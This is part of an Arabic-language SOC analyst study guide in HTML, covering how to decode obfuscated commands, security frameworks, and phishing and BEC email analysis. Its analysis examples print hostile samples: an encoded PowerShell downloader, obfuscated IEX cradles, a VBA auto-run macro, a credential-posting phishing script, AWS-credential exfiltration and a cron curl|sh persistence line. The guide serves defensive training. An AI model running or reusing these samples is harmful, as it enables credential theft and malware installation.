+<tr><td>Hex</td><td>0-9 a-f بس، طول زوجي، أحياناً <code class="i">0x</code> أو <code class="i">\x</code></td><td class="m">706f7765727368656c6c</td><td class="m">powershell</td></tr>
+<tr><td>URL encoding</td><td><code class="i">%</code> + رقمين hex</td><td class="m">1%27%20UNION%20SELECT</td><td class="m">1' UNION SELECT</td></tr>
+<tr><td>Double URL</td><td><code class="i">%25</code> = <code class="i">%</code></td><td class="m">%252e%252e%252f</td><td class="m">../</td></tr>
+<tr><td>HTML entities</td><td><code class="i">&amp;#..;</code> أو <code class="i">&amp;lt;</code></td><td class="m">&amp;#60;script&amp;#62;</td><td class="m">&lt;script&gt;</td></tr>
+<tr><td>Char codes</td><td>أرقام ASCII</td><td class="m">[char]73+[char]69+[char]88</td><td class="m">IEX</td></tr>
+<tr><td>ROT13</td><td>نص إنجليزي "مقلوب"</td><td class="m">uggcf://rivy.pbz</td><td class="m">https://evil.com</td></tr>
+</table></div>
+<div class="callout tip"><b class="t">💡 Patterns تحفظها لـ PowerShell -EncodedCommand</b>
+<code class="i">SQBFAFgA</code> = <code class="i">IEX</code> &nbsp;|&nbsp; <code class="i">aQBlAHgA</code> = <code class="i">iex</code> &nbsp;|&nbsp; <code class="i">JAB</code> = <code class="i">$</code> (متغير) &nbsp;|&nbsp; <code class="i">SUVY</code> = IEX بـ UTF-8 &nbsp;|&nbsp; <code class="i">TVqQ</code> = <b>MZ header</b> (ملف exe متشفر base64!) &nbsp;|&nbsp; <code class="i">H4sI</code> = Gzip compressed.
+في <b>CyberChef</b>: <code class="i">From Base64</code> ثم <code class="i">Decode text (UTF-16LE)</code> — أو استخدم الأداة اللي <a href="#tools">في آخر الملف</a>.
+</div>
+
+<h3>مثال 1: PowerShell خبيث — اقراه سطر سطر</h3>
+<pre>powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAGMALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACIAaAB0AHQAcAA6AC8ALwAxADkAOAAuADUAMQAuADEAMAAwAC4ANwA3AC8AdQBwAGQALgBlAHgAZQAiACwAIgAkAGUAbgB2ADoAVABFAE0AUABcAHUAcABkAC4AZQB4AGUAIgApADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAJABlAG4AdgA6AFQARQBNAFAAXAB1AHAAZAAuAGUAeABlACIA
+
+<span class="c"># بعد الـ Decode:</span>
+<span class="r">$c=New-Object Net.WebClient;$c.DownloadFile("http://198.51.100.77/upd.exe","$env:TEMP\upd.exe");Start-Process "$env:TEMP\upd.exe"</span></pre>
+<div class="tbl"><table>
+<tr><th>الجزء</th><th>معناه</th></tr>
+<tr><td class="m">-NoP</td><td>NoProfile — مايحمّلش profile اليوزر (أسرع وأخفى)</td></tr>
+<tr><td class="m">-NonI</td><td>NonInteractive</td></tr>
+<tr><td class="m">-W Hidden</td><td>WindowStyle Hidden — مفيش شباك يبان لليوزر 🚩</td></tr>
+<tr><td class="m">-Exec Bypass</td><td>ExecutionPolicy Bypass — تخطي سياسة منع السكريبتات 🚩</td></tr>
+<tr><td class="m">-enc</td><td>EncodedCommand — Base64 UTF-16LE عشان يستخبى من الـ detection 🚩</td></tr>
+<tr><td class="m">Net.WebClient + DownloadFile</td><td>Download cradle (T1105 Ingress Tool Transfer)</td></tr>
+<tr><td class="m">$env:TEMP + Start-Process</td><td>حفظ في Temp وتشغيل (T1204 / T1059.001)</td></tr>
+</table></div>
+<p><b>الخلاصة اللي تكتبها:</b> "الـ command ده Stage-1 downloader: بيستخدم PowerShell مخفي ومشفر ينزّل <code class="i">upd.exe</code> من <code class="i">198.51.100[.]77</code> ويشغّله من %TEMP%. IOCs: IP، URL، filename. الخطوة الجاية: hash الملف، EDR على الجهاز، شوف مين تاني كلم الـ IP ده في Proxy/FW logs."</p>
+
+<h3>مثال 2: تقنيات Obfuscation شائعة في PowerShell</h3>
+<pre><span class="c"># String concatenation</span>
+IEX (New-Object Net.WebClient).('Down'+'load'+'String')('http://x/a.ps1')
+<span class="c"># Backticks (بتتجاهل)</span>
+I`E`X  ;  (N`ew-Obj`ect Net.WebClient)
+<span class="c"># Char array</span>
+&amp;([char]73+[char]69+[char]88)   <span class="c"># = IEX</span>
+<span class="c"># Reverse string</span>
+-join ('gnirtSdaolnwoD'[-1..-100])
+<span class="c"># Format operator</span>
+("{1}{0}{2}" -f 'Ex','I','X')    <span class="c"># = IEX</span>
+<span class="c"># Aliases: iex=Invoke-Expression, iwr=Invoke-WebRequest, irm=Invoke-RestMethod, sal=Set-Alias</span>
+iwr http://x/a.ps1 | iex     ;   irm http://x/a | iex
+<span class="c"># AMSI bypass attempt (keyword تحفظها)</span>
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')...</pre>
+<div class="callout info"><b class="t">Event ID 4104 هو صاحبك</b> PowerShell Script Block Logging بيسجّل الكود <b>بعد</b> ما يتفك (deobfuscated) — فلو اللوج متاح، شوف 4104 بدل ما تتعب في الفك.</div>
+
+<h3>مثال 3: VBA Macro (Word/Excel)</h3>
+<pre>Sub <span class="r">AutoOpen()</span>                     <span class="c">' بيشتغل أول ما الملف يفتح (Document_Open / Workbook_Open نفس الفكرة)</span>
+    Dim s As String
+    s = "powershell -w hidden -enc " &amp; ActiveDocument.Variables("p").Value   <span class="c">' الـ payload مستخبي جوه الملف</span>
+    Set o = <span class="r">CreateObject("WScript.Shell")</span>
+    o.<span class="r">Run</span> s, 0                     <span class="c">' 0 = hidden window</span>
+End Sub</pre>
+<p><b>Keywords خطيرة في الـ macro:</b> <code class="i">AutoOpen</code>، <code class="i">Document_Open</code>، <code class="i">Shell</code>، <code class="i">WScript.Shell</code>، <code class="i">CreateObject</code>، <code class="i">URLDownloadToFile</code>، <code class="i">MSXML2.XMLHTTP</code>، <code class="i">ADODB.Stream</code>، <code class="i">Chr()</code>، <code class="i">StrReverse</code>. الأداة: <code class="i">olevba file.docm</code>.</p>
+
+<h3>مثال 4: صفحة Phishing HTML (attachment)</h3>
+<pre>&lt;script&gt;
+  var u = <span class="r">atob</span>("aHR0cHM6Ly9tMzY1LXZlcmlmeS1sb2dpbi53ZWIuYXBwL3N1Ym1pdC5waHA=");  <span class="c">// = https://m365-verify-login.web.app/submit.php</span>
+  document.getElementById("email").value = "<span class="y">ahmed.ali@company.com</span>";   <span class="c">// الإيميل متعبّي مسبقاً = Targeted</span>
+  function go(){
+     fetch(u, {method:"POST", body: new FormData(document.forms[0])});      <span class="c">// بيبعت الباسورد للمهاجم</span>
+     window.location = "https://outlook.office.com";                       <span class="c">// ويحوّل الضحية للموقع الحقيقي عشان مايشكش</span>
+  }
+&lt;/script&gt;</pre>
+<p><b>كلمات مريبة في JS:</b> <code class="i">atob</code>، <code class="i">eval</code>، <code class="i">unescape</code>، <code class="i">document.write</code>، <code class="i">String.fromCharCode</code>، <code class="i">window.location</code>، <code class="i">fetch/XMLHttpRequest</code> لدومين خارجي، <code class="i">Blob</code> + <code class="i">msSaveOrOpenBlob</code> (= HTML Smuggling)، Telegram bot API (<code class="i">api.telegram.org/bot</code>) لاستقبال الباسوردات.</p>
+
+<h3>مثال 5: Python & Bash</h3>
+<pre><span class="c"># Python: إيه اللي بيعمله الكود ده؟</span>
+import os, requests, base64
+data = open(os.path.expanduser("~/.aws/credentials")).read()           <span class="c"># 🚩 يقرا credentials</span>
+requests.post("https://198.51.100.9/c", data=base64.b64encode(data.encode()))  <span class="c"># 🚩 Exfiltration مشفّرة base64</span>
+
+<span class="c"># Bash cron persistence + cryptominer</span>
+(crontab -l 2&gt;/dev/null; echo "*/5 * * * * curl -fsSL http://198.51.100.9/m.sh | sh") | crontab -
+chmod +x /tmp/.x/kworker &amp;&amp; nohup /tmp/.x/kworker -o pool.example:3333 &amp;    <span class="c"># 🚩 اسم مقلّد لـ kernel thread + مجلد مخفي</span></pre>
+
+<h3>Regex سريع لاستخراج IOCs</h3>
+<pre>IPv4    :  \b(?:\d{1,3}\.){3}\d{1,3}\b
+Domain  :  \b[a-z0-9-]+(\.[a-z0-9-]+)*\.[a-z]{2,}\b
+MD5     :  \b[a-fA-F0-9]{32}\b      SHA1: {40}     SHA256: {64}
+Email   :  [\w.+-]+@[\w-]+\.[\w.]+
+Base64  :  [A-Za-z0-9+/]{20,}={0,2}</pre>
+</section>
+
+<!-- ===================== CONCEPTS ===================== -->
+<section class="sec" id="concepts">
+<header><h2><span class="num">05</span>مفاهيم أمنية و Frameworks</h2><label class="donebox"><input type="checkbox">خلصته</label></header>
+
+<div class="grid3">
+<div class="card"><h4>CIA Triad</h4><ul><li><b>C</b>onfidentiality — Encryption، Access control</li><li><b>I</b>ntegrity — Hashing، Signatures</li><li><b>A</b>vailability — Backups، Redundancy (DDoS بيضرب دي)</li></ul></div>
+<div class="card"><h4>AAA</h4><ul><li><b>Authentication</b> إنت مين؟ (Password، MFA)</li><li><b>Authorization</b> مسموحلك بإيه؟</li><li><b>Accounting</b> عملت إيه؟ (Logs)</li></ul></div>
+<div class="card"><h4>مبادئ</h4><ul><li>Defense in Depth</li><li>Least Privilege</li><li>Zero Trust ("Never trust, always verify")</li><li>Separation of Duties</li></ul></div>
+</div>
+
+<h3>Vulnerability / Threat / Risk / Exploit</h3>
+<ul>
+<li><b>Vulnerability:</b> ثغرة/ضعف (Apache قديم مش متحدّث). <b>CVE</b> = رقمها، <b>CVSS</b> = خطورتها 0-10، <b>CWE</b> = نوع الضعف.</li>
+<li><b>Threat:</b> حد/حاجة ممكن تستغل الثغرة (Ransomware gang).</li>
+<li><b>Exploit:</b> الكود/الطريقة اللي بتستغل الثغرة.</li>
+<li><b>Risk = Threat × Vulnerability × Impact</b>.</li>
+<li><b>Zero-day:</b> ثغرة مش معروفة للـ vendor ومفيش patch.</li>
+</ul>
+
+<h3>Alert Classification</h3>
+<div class="tbl"><table>
+<tr><th></th><th>الـ Alert اشتغل</th><th>الـ Alert ماشتغلش</th></tr>
+<tr><td><b>فيه هجوم فعلاً</b></td><td><span class="badge b-red">True Positive</span> — تمام، اشتغل</td><td><span class="badge b-red">False Negative</span> — الأخطر! هجوم فات</td></tr>
+<tr><td><b>مفيش هجوم</b></td><td><span class="badge b-yel">False Positive</span> — Noise، اعمل Tuning</td><td><span class="badge b-green">True Negative</span></td></tr>
+</table></div>
+<p><b>Benign True Positive:</b> الـ rule صح والنشاط حصل فعلاً بس مقصود (مثلاً IT admin بيعمل Nmap scan مُصرّح). ده مش FP — ده محتاج <b>تأكيد</b> + Whitelist بشروط.</p>
+
+<h3>Cyber Kill Chain (Lockheed Martin)</h3>
+<ol class="steps">
+<li><b>Reconnaissance</b> — جمع معلومات (LinkedIn، Shodan، scanning)</li>
+<li><b>Weaponization</b> — تجهيز الـ payload (doc فيه macro)</li>
+<li><b>Delivery</b> — إيميل، USB، Website</li>
+<li><b>Exploitation</b> — تشغيل الكود (اليوزر فتح الملف / ثغرة)</li>
+<li><b>Installation</b> — Persistence (backdoor)</li>
+<li><b>Command &amp; Control (C2)</b> — قناة تحكم</li>
+<li><b>Actions on Objectives</b> — Exfil، Encryption، Destruction</li>
+</ol>
+<p class="muted">كل ما توقف الهجوم بدري في السلسلة، كل ما الخسارة أقل.</p>
+
+<h3>MITRE ATT&amp;CK — 14 Tactics + Techniques الأشهر</h3>
+<div class="tbl"><table>
+<tr><th>Tactic (الـ "ليه")</th><th>Techniques شائعة (الـ "إزاي")</th></tr>
+<tr><td>Reconnaissance (TA0043)</td><td>T1595 Active Scanning، T1589 Gather Victim Identity Info</td></tr>
+<tr><td>Resource Development (TA0042)</td><td>T1583 Acquire Infrastructure (domains/VPS)</td></tr>
+<tr><td><b>Initial Access</b> (TA0001)</td><td><b>T1566 Phishing</b> (.001 Attachment، .002 Link)، T1190 Exploit Public-Facing App، T1078 Valid Accounts، T1133 External Remote Services</td></tr>
+<tr><td><b>Execution</b> (TA0002)</td><td>T1059 Command &amp; Scripting (.001 PowerShell، .003 cmd، .005 VBA)، T1204 User Execution، T1047 WMI</td></tr>
+<tr><td>Persistence (TA0003)</td><td>T1547.001 Run Keys، T1053.005 Scheduled Task، T1543.003 Windows Service، T1136 Create Account، T1505.003 Web Shell</td></tr>
+<tr><td>Privilege Escalation (TA0004)</td><td>T1068 Exploitation for PrivEsc، T1548.002 UAC Bypass</td></tr>
+<tr><td>Defense Evasion (TA0005)</td><td>T1027 Obfuscation، T1218 System Binary Proxy (mshta/rundll32/regsvr32)، T1070.001 Clear Logs، T1562.001 Disable AV</td></tr>
+<tr><td><b>Credential Access</b> (TA0006)</td><td>T1110 Brute Force (.003 Spraying، .004 Stuffing)، <b>T1003.001 LSASS Memory</b>، T1558.003 Kerberoasting، T1557 AiTM</td></tr>
+<tr><td>Discovery (TA0007)</td><td>T1087 Account Discovery، T1046 Network Service Discovery، T1082 System Info، T1018 Remote System Discovery</td></tr>
+<tr><td><b>Lateral Movement</b> (TA0008)</td><td>T1021.001 RDP، T1021.002 SMB/Admin Shares، T1021.006 WinRM، T1550.002 Pass-the-Hash</td></tr>
+<tr><td>Collection (TA0009)</td><td>T1560 Archive Collected Data، T1114 Email Collection</td></tr>
+<tr><td><b>Command &amp; Control</b> (TA0011)</td><td>T1071.001 Web Protocols، T1071.004 DNS، T1105 Ingress Tool Transfer، T1573 Encrypted Channel</td></tr>
+<tr><td>Exfiltration (TA0010)</td><td>T1041 Exfil over C2، T1048 Alternative Protocol، T1567 Exfil to Web Service (Mega، Dropbox)</td></tr>
+<tr><td><b>Impact</b> (TA0040)</td><td><b>T1486 Data Encrypted (Ransomware)</b>، T1490 Inhibit System Recovery، T1498/T1499 DoS</td></tr>
+</table></div>
+
+<h3>Pyramid of Pain (David Bianco)</h3>
+<div class="tbl"><table>
+<tr><th>المستوى (من تحت لفوق)</th><th>صعوبة على المهاجم لو اتعمله Block</th></tr>
+<tr><td>Hash values</td><td>Trivial — يغيّر byte واحد</td></tr>
+<tr><td>IP addresses</td><td>Easy</td></tr>
+<tr><td>Domain names</td><td>Simple</td></tr>
+<tr><td>Network/Host artifacts (UA، registry، named pipe)</td><td>Annoying</td></tr>
+<tr><td>Tools (Mimikatz، Cobalt Strike)</td><td>Challenging</td></tr>
+<tr><td><b>TTPs</b> (السلوك)</td><td><b>Tough</b> — لازم يغير طريقة شغله كلها ← عشان كده الـ Behavior-based detection أقوى</td></tr>
+</table></div>
+
+<h3>Incident Response Lifecycle</h3>
+<div class="grid2">
+<div class="card"><h4>NIST SP 800-61</h4><ol><li>Preparation</li><li>Detection &amp; Analysis</li><li>Containment, Eradication &amp; Recovery</li><li>Post-Incident Activity (Lessons learned)</li></ol></div>
+<div class="card"><h4>SANS (PICERL)</h4><ol><li>Preparation</li><li>Identification</li><li>Containment</li><li>Eradication</li><li>Recovery</li><li>Lessons Learned</li></ol></div>
+</div>
+<p><b>Containment أمثلة:</b> Isolate host من الـ EDR، Disable account، Reset password + Revoke sessions/tokens، Block IP/Domain/Hash، Purge emails. <b>Eradication:</b> شيل الـ malware والـ persistence. <b>Recovery:</b> رجّع من backup، Monitor.</p>
+
+<h3>Threat Intelligence</h3>
+<ul>
+<li><b>IOC</b> (Indicator of Compromise) = دليل حصل (hash، IP). <b>IOA</b> (Indicator of Attack) = سلوك بيحصل (Word بيشغل PowerShell).</li>
+<li>أنواع TI: <b>Strategic</b> (للإدارة)، <b>Tactical</b> (TTPs)، <b>Operational</b> (حملات معينة)، <b>Technical</b> (IOCs).</li>
+<li><b>TLP 2.0:</b> RED (للمستلم بس)، AMBER+STRICT (المؤسسة بس)، AMBER (المؤسسة + العملاء)، GREEN (المجتمع)، CLEAR (عام).</li>
+<li><b>STIX</b> = format لتمثيل الـ TI، <b>TAXII</b> = بروتوكول نقله. منصات: MISP، OpenCTI.</li>
+</ul>
+
+<h3>Cryptography سريع</h3>
+<ul>
+<li><b>Symmetric</b> (Key واحد): AES، أسرع — لتشفير البيانات. <b>Asymmetric</b> (Public/Private): RSA، ECC — لتبادل المفاتيح والتوقيع.</li>
+<li><b>Digital Signature:</b> Hash + تشفير بالـ Private key للمرسل ← Integrity + Authentication + Non-repudiation.</li>
+<li><b>Salt:</b> قيمة عشوائية مع الباسورد قبل الـ hash ← ضد Rainbow tables.</li>
+<li><b>PKI / Certificates:</b> CA بتوقّع على الـ public key بتاع الموقع.</li>
+</ul>
+
+<h3>SOC Structure</h3>
+<p><b>L1 (Triage):</b> يراقب الـ alerts، يصنّف TP/FP، يعمل escalation. <b>L2 (Incident Responder):</b> تحليل أعمق، Containment. <b>L3 (Threat Hunter / Expert):</b> Hunting، Malware analysis، Detection engineering. مقاييس: <b>MTTD</b> (Mean Time To Detect) و <b>MTTR</b> (Mean Time To Respond).</p>
+</section>
+
+<!-- ===================== PHISHING ===================== -->
+<section class="sec" id="phishing">
+<header><h2><span class="num">06</span>Phishing Analysis — من الألف للياء</h2><label class="donebox"><input type="checkbox">خلصته</label></header>
+
+<div class="callout danger"><b class="t">🎯 ده غالباً أول وأهم جزء في الـ Assessment</b>
+هيدّوك إيميل (.eml أو headers + body) ويقولولك: حلله، هل هو Phishing؟ ليه؟ وإيه الـ Actions؟ — اتبع الـ Checklist اللي تحت بالترتيب وانت هتجيب الدرجة كاملة.</div>
+
+<h3>أنواع الـ Phishing</h3>
+<div class="tbl"><table>
+<tr><th>النوع</th><th>الوصف</th></tr>
+<tr><td><b>Credential Harvesting</b></td><td>لينك لصفحة Login مزيفة (Microsoft 365، بنك، DHL)</td></tr>
+<tr><td><b>Malware Delivery</b></td><td>Attachment (docm، xlsm، zip، iso، lnk، html، one، pdf) أو لينك لتحميل ملف</td></tr>
+<tr><td><b>Spear Phishing / Whaling</b></td><td>موجّه لشخص معين / لمدير كبير</td></tr>
+<tr><td><b>BEC</b> (Business Email Compromise)</td><td>انتحال CEO/مورّد لطلب تحويل فلوس أو Gift cards — <u>غالباً مفيش لينك ولا attachment</u></td></tr>
+<tr><td><b>Clone Phishing</b></td><td>نسخة من إيميل حقيقي سابق مع تغيير اللينك</td></tr>
+<tr><td><b>Smishing / Vishing / Quishing</b></td><td>SMS / مكالمة / QR code (بيعدي من فلاتر اللينكات لأنه صورة)</td></tr>
+<tr><td><b>Callback Phishing (TOAD)</b></td><td>"اشتراكك اتجدد بـ 499$ كلمنا على الرقم ده" ← المكالمة توديك لتنزيل Remote tool</td></tr>
+<tr><td><b>AiTM</b> (Adversary-in-the-Middle)</td><td>Reverse proxy (Evilginx) بيسرق الـ <b>Session cookie</b> ← بيعدّي الـ MFA!</td></tr>
+<tr><td><b>OAuth Consent Phishing</b></td><td>"اسمح للـ App ده يوصل لإيميلك" ← وصول بدون باسورد</td></tr>
+</table></div>
+
+<h3>Email Headers — اقرأها صح</h3>
+<div class="tbl"><table>
+<tr><th>Header</th><th>معناه</th><th>بتدوّر على إيه</th></tr>
+<tr><td class="m">From</td><td>المرسل اللي اليوزر شايفه (سهل يتزور)</td><td>Display name spoofing، Lookalike domain (rn بدل m، 0 بدل o)</td></tr>
+<tr><td class="m">Return-Path</td><td>الـ Envelope sender (MAIL FROM) — الردود الفاشلة بتروحله، و <b>SPF بيتشيك عليه</b></td><td>مختلف عن From؟</td></tr>
+<tr><td class="m">Reply-To</td><td>الرد هيروح فين</td><td>مختلف عن From = 🚩 كلاسيك BEC</td></tr>
+<tr><td class="m">Received</td><td>كل سيرفر عدّى عليه الإيميل بيضيف سطر</td><td><b>اقرأ من تحت لفوق</b> — أول Received (الأسفل) فيه الـ IP الأصلي للمرسل</td></tr>
+<tr><td class="m">Message-ID</td><td>ID فريد بيعمله سيرفر المرسل</td><td>دومين الـ Message-ID مختلف عن From</td></tr>
+<tr><td class="m">Authentication-Results</td><td>نتيجة SPF/DKIM/DMARC</td><td>fail / softfail / none</td></tr>
+<tr><td class="m">X-Originating-IP / X-Sender-IP</td><td>IP العميل الأصلي (أحياناً)</td><td>Geo غريب</td></tr>
+<tr><td class="m">X-Mailer / User-Agent</td><td>البرنامج اللي بعت</td><td>PHPMailer، python، Mass mailer</td></tr>
+<tr><td class="m">Date</td><td>وقت الإرسال</td><td>متوافق مع الـ Received؟</td></tr>
+</table></div>
+
+<h3>SPF / DKIM / DMARC — الشرح اللي هتحتاجه</h3>
+<div class="grid3">
+<div class="card"><h4>SPF</h4><p>"مين الـ IPs/السيرفرات المسموح لها تبعت باسم الدومين ده؟" — TXT record. بيتشيك على دومين الـ <b>Return-Path</b> (مش From!).</p>
+<pre>v=spf1 ip4:192.0.2.0/24 include:spf.protection.outlook.com -all</pre>
+<p><code class="i">-all</code> Fail (رفض) · <code class="i">~all</code> SoftFail · <code class="i">?all</code> Neutral · <code class="i">+all</code> أي حد (كارثة)</p></div>
+<div class="card"><h4>DKIM</h4><p>توقيع رقمي على الـ headers والـ body بالـ Private key للدومين، والـ Public key في DNS. بيثبت إن الإيميل <b>ماتعدّلش</b> وإنه من الدومين اللي في <code class="i">d=</code>.</p>
+<pre>DKIM-Signature: v=1; a=rsa-sha256;
+ d=company.com; s=selector1; ...
+→ selector1._domainkey.company.com</pre></div>
+<div class="card"><h4>DMARC</h4><p>بيربط النتيجتين بدومين الـ <b>From</b> (Alignment) ويقول تعمل إيه لو فشل:</p>
+<pre>_dmarc.company.com TXT
+"v=DMARC1; p=reject; rua=mailto:dmarc@company.com"</pre>
+<p><code class="i">p=none</code> مراقبة بس · <code class="i">quarantine</code> Spam · <code class="i">reject</code> رفض</p></div>
+</div>
+<div class="callout warn"><b class="t">⚠️ أهم نقطة يسألوا فيها</b>
+<b>SPF/DKIM/DMARC = PASS ≠ الإيميل آمن.</b> الهاكر ممكن يشتري دومين <code class="i">micros0ft-support.com</code> ويظبطله SPF و DKIM و DMARC صح، فكله يعدي Pass. اللي بيثبتوه إن الإيميل <u>فعلاً جاي من الدومين ده</u> — مش إن الدومين نفسه شرعي. ونفس الكلام لو الإيميل من حساب Gmail أو حساب حقيقي اتسرق (Compromised account).</div>
+
+<h3>Phishing Analysis Checklist (اتبعها بالترتيب)</h3>
+<ol class="steps">
+<li><b>Sender analysis:</b> Display name vs email address؟ الدومين Lookalike؟ (عمره كام يوم — WHOIS). Reply-To / Return-Path مختلفين؟</li>
+<li><b>Authentication:</b> SPF / DKIM / DMARC نتايجهم؟ و Alignment؟</li>
+<li><b>Received chain:</b> الـ Originating IP إيه؟ سمعته (AbuseIPDB)؟ Geo؟ Hosting/VPS؟</li>
+<li><b>Content / Social engineering:</b> Urgency ("خلال 24 ساعة")، Fear، Authority، Reward، أخطاء لغوية، تحية عامة "Dear user"، Branding مش مظبوط.</li>
+<li><b>URLs:</b> النص الظاهر vs الـ href الحقيقي؟ URL shorteners؟ Redirects؟ دومين جديد؟ ← افحص في <b>urlscan.io</b> و <b>VirusTotal</b> (من غير ما تفتحه!).</li>
+<li><b>Attachments:</b> النوع الحقيقي (Double extension <code class="i">invoice.pdf.exe</code>)؟ Hash ← VirusTotal؟ Macros (olevba)؟ Sandbox (any.run/Joe/Hybrid Analysis)؟</li>
+<li><b>Scope:</b> مين تاني استلم نفس الإيميل؟ (Search بالـ Subject/Sender/URL) — مين <b>داس</b>؟ (Proxy logs) — مين <b>دخل credentials</b>؟ (POST للدومين) — مين <b>شغّل</b> الملف؟ (EDR)</li>
+<li><b>Verdict + Actions.</b></li>
+</ol>
+
+<!-- Sample 1 -->
+<div class="lab">
+<div class="lt">📧 مثال كامل #1 — Credential Harvesting (Microsoft 365 lookalike)</div>
+<pre><span class="b">Return-Path:</span> &lt;bounce-77@mail-secure-notify.top&gt;
+<span class="b">Received:</span> from mx.company.com (10.0.0.25) by EXCH01.company.local; Thu, 20 Nov 2026 08:14:25 +0000
+<span class="b">Received:</span> from mail-secure-notify.top (<span class="r">unknown [203.0.113.45]</span>)
+        by mx.company.com (Postfix) with ESMTP id 4F2A1C0B12
+        for &lt;ahmed.ali@company.com&gt;; Thu, 20 Nov 2026 08:14:22 +0000 (UTC)
+<span class="b">Authentication-Results:</span> mx.company.com;
+       <span class="r">spf=fail</span> (203.0.113.45 is not permitted) smtp.mailfrom=mail-secure-notify.top;
+       <span class="r">dkim=none</span> (message not signed);
+       <span class="r">dmarc=none</span> header.from=micros0ft-support.com
+<span class="b">From:</span> "Microsoft 365 Security" &lt;<span class="r">security@micros0ft-support.com</span>&gt;
+<span class="b">Reply-To:</span> <span class="r">it.helpdesk.verify@outlook-mail.example</span>
+<span class="b">To:</span> ahmed.ali@company.com
+<span class="b">Subject:</span> <span class="y">[ACTION REQUIRED] Your mailbox will be suspended in 24 hours</span>
+<span class="b">Date:</span> Thu, 20 Nov 2026 08:14:20 +0000
+<span class="b">Message-ID:</span> &lt;20261120081420.1A2B3C@mail-secure-notify.top&gt;
+<span class="b">X-Mailer:</span> <span class="r">PHPMailer 6.5.0</span>
+Content-Type: text/html; charset="UTF-8"
+
+Dear User,
+We detected unusual sign-in activity. Your mailbox storage is full and will be
+<b>permanently deactivated within 24 hours</b>. To avoid losing your emails, verify your account now:
+
+  &lt;a href="<span class="r">https://m365-verify-login.web.app/owa/?u=ahmed.ali@company.com</span>"&gt;<span class="g">https://outlook.office365.com/verify</span>&lt;/a&gt;
+
+Microsoft Corporation | One Microsoft Way, Redmond</pre>
+
+<details class="ans"><summary>اظهر التحليل الكامل (حاول الأول!)</summary><div class="body">
+<h4>Findings</h4>
+<div class="tbl"><table>
+<tr><th>#</th><th>الدليل</th><th>ليه مريب</th></tr>
+<tr><td>1</td><td>From: <code class="i">micros0ft-support.com</code></td><td>Lookalike/Typosquatting — رقم <b>0</b> بدل حرف o. مايكروسوفت بتبعت من <code class="i">microsoft.com</code> / <code class="i">accountprotection.microsoft.com</code></td></tr>
+<tr><td>2</td><td>Return-Path <code class="i">mail-secure-notify.top</code> ≠ From</td><td>دومين تالت مختلف، TLD رخيص (.top)</td></tr>
+<tr><td>3</td><td>Reply-To لحساب تاني</td><td>Mismatch</td></tr>
+<tr><td>4</td><td>SPF fail، DKIM none، DMARC none</td><td>مفيش أي authentication</td></tr>
+<tr><td>5</td><td>Originating IP <code class="i">203.0.113.45</code> (أول Received من تحت)</td><td>مش IP لمايكروسوفت — اعمله lookup في AbuseIPDB</td></tr>
+<tr><td>6</td><td>X-Mailer: PHPMailer</td><td>Mass mailer — غالباً من web host مخترق</td></tr>
+<tr><td>7</td><td>النص الظاهر <code class="i">outlook.office365.com</code> بس الـ href <code class="i">m365-verify-login.web.app</code></td><td>Link mismatch — صفحة على Firebase hosting (خدمة مجانية بيستغلوها)</td></tr>
+<tr><td>8</td><td>الإيميل موجود في الـ URL (<code class="i">?u=</code>)</td><td>بيملّى الإيميل مسبقاً + بيتتبّع مين داس</td></tr>
+<tr><td>9</td><td>Urgency "24 hours" + Fear + "Dear User"</td><td>Social engineering كلاسيك</td></tr>
+</table></div>
+<p><b>Verdict:</b> <span class="badge b-red">Malicious — Credential Harvesting Phishing</span> · MITRE: <b>T1566.002</b> (Spearphishing Link) → T1056/T1598 · Severity: <b>Medium</b> لو محدش داس، <b>High</b> لو حد دخّل باسورد.</p>
+<p><b>IOCs (defanged):</b> <code class="i">micros0ft-support[.]com</code> · <code class="i">mail-secure-notify[.]top</code> · <code class="i">203.0.113[.]45</code> · <code class="i">hxxps://m365-verify-login[.]web[.]app/owa/</code> · Subject.</p>
+<p><b>Actions:</b></p>
+<ol>
+<li>Search في الـ mail gateway على كل المستلمين ← <b>Purge</b> الإيميل من كل الـ mailboxes.</li>
+<li>Block الـ sender domains + IP + URL (Email GW + Proxy + DNS).</li>
+<li>Proxy logs: مين زار <code class="i">m365-verify-login.web.app</code>؟ هل فيه <b>POST</b>؟ ← دول اتسرق منهم الباسورد.</li>
+<li>للي دخّلوا بياناتهم: Reset password + <b>Revoke sessions/tokens</b> + راجع Sign-in logs (Entra ID) لأي login من IP غريب + شيك على MFA methods و <b>Inbox rules</b> جديدة (Forward/Delete).</li>
+<li>Report الـ URL لـ Google/Firebase abuse، وبلّغ اليوزر (Awareness).</li>
+</ol>
+</div></details>
+</div>
+
+<!-- Sample 2 -->
+<div class="lab">
+<div class="lt">📧 مثال #2 — BEC (مفيش لينك ولا attachment!)</div>
+<pre><span class="b">Authentication-Results:</span> spf=<span class="g">pass</span> smtp.mailfrom=gmail.com; dkim=<span class="g">pass</span> header.d=gmail.com; dmarc=<span class="g">pass</span> header.from=gmail.com
+<span class="b">From:</span> "<span class="y">Mohamed Hassan (CEO)</span>" &lt;<span class="r">mohamed.hassan.ceo.office@gmail.com</span>&gt;
+<span class="b">Reply-To:</span> &lt;<span class="r">m.hassan.private@protonmail.example</span>&gt;
+<span class="b">To:</span> sara.finance@company.com
+<span class="b">Subject:</span> Urgent - Confidential
+<span class="b">X-Originating-IP:</span> 198.51.100.140
+
+Hi Sara,
+Are you at your desk? I'm in a board meeting and can't talk on the phone.
+I need you to process an urgent wire transfer of $48,500 to a new vendor today
+before 3 PM. Keep this confidential until the acquisition is announced.
+I'll send you the bank details once you confirm.
+Sent from my iPhone</pre>
+<details class="ans"><summary>اظهر التحليل</summary><div class="body">
+<ul>
+<li><b>كل الـ Authentication = PASS</b> لأنه فعلاً جاي من Gmail — ده بالظبط الفخ. الـ CEO مش هيستخدم Gmail شخصي.</li>
+<li><b>Display name spoofing:</b> الاسم اسم الـ CEO بس الإيميل خارجي.</li>
+<li><b>Reply-To</b> لدومين تالت (protonmail) ← الرد مش هيروح للـ Gmail حتى.</li>
+<li>Social engineering: <b>Authority</b> (CEO) + <b>Urgency</b> (before 3 PM) + <b>Secrecy</b> (confidential) + <b>منع التحقق</b> ("can't talk on the phone") + مورّد <b>جديد</b>.</li>
